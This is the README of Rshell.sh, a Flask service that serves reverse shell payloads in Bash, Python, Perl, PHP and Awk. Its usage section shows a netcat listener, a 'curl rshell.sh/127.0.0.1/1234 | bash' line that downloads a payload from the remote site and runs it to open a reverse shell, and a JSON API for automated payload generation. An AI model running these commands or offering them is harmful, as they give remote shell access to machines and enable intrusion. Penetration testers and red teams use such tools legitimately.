# Rshell.sh Reverse Shell Payloads aaS

[Live Site!](https://rshell.sh)

## Overview / How it works

This project is multi-language reverse shell payload generator written in
Python3 using the Flask web framework. The point is to make it easy to quickly
pull reverse shell payloads down from the *cloud* ☁️  to your terminal using
`curl` or `wget`. It also supports a robust JSON API to help the user integrate
automated remote reverse shell payload generation into their own applications.

## Basic Usage Info

### Example Usecase

* Setup your netcat listener:

```
nc -lvnp 1234
```

* Then query [`rshell.sh`](https://rshell.sh) to kick off the reverse shell:

```
curl rshell.sh/127.0.0.1/1234 | bash
```

### Languages Covered

* Bash
* Python
* Perl
* PHP
* Awk

### Shells Covered

* bash
* csh
* ksh
* zsh

### API

```
curl -X POST https://rshell.sh/api \
    -H "Content-Type: application/json" \
    -sd '{"host":"10.0.0.1", "port":1234, "lang":"python", "shell":"zsh"}'
```

### Help Page

See the project __[help page](https://rshell.sh/help)__ for more information.

You can also read the help page in your terminal!

```
curl rshell.sh/help | less
```

## Dev Site Install / Setup

The server-side setup is pretty straight forward and this is run just like any
other flask app. Of course the instructions below are for spinning up the dev
version. Production setup involves extra steps and depends on your hosting
environment.

* First clone the repo:

```
git clone https://github.com/BlueSquare23/Rshell.sh
```

* Then install the required python modules:

```
cd Rshell.sh
virtualenv venv             # Virtual Env Optional
source venv/bin/activate    # Virtual Env Optional
pip3 install -r requirements.txt
```

* Finally, run the project:

```
python3 app.py
```

### Testing

The test are written using [`pytest`](https://pytest.org/). You can run the
test code by cd'ing into the project's main directory and running pytest.

```
cd Rshell.sh
virtualenv venv             # Virtual Env Optional
source venv/bin/activate    # Virtual Env Optional
python3 -m pytest
```

## Technologies

* Language: [Python 3](https://www.python.org/)
* Web-Framework: [Flask](https://palletsprojects.com/p/flask/)

